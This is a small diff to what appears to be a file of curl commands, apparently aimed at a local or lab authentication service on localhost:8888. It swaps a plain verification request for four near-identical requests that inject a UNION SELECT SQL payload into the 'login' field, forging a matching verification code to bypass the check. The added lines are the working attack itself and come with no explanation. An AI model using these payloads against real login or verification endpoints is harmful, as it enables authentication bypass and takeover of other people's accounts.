@@ -1,3 +1,7 @@
-curl 'http://localhost:8888/api/auth/verification' \
-  -H 'Content-Type: application/json' \
-  --data-raw $'{"login":"login","code":"8888"}'
+curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '0000', null, null -- \", \"code\":\"0000\"}"
+
+curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '0000', null, null -- \", \"code\":\"0000\"}"
+
+curl "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '0000', null, null -- \", \"code\":\"0000\"}"
+
+curl -v "http://localhost:8888/api/auth/verification" -H 'Content-Type:application/json' -d "{\"login\":\"masha' union select null, 'masha', '1111', null, null -- \", \"code\":\"1111\"}"
